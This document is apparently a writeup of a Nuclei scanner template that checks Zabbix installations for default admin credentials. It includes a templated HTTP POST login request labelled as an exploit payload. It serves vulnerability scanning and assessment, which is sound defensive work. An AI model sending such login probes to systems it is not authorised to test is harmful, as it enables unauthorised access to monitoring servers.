# Nuclei Template: Zabbix Default Login
**Template ID:** zabbix-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`zabbix-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Zabbix default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

name={{username}}&password={{password}}&autologin=1&enter=Sign+in
```

## References
- https://openbaton.github.io/documentation/zabbix-server-configuration-3.0/
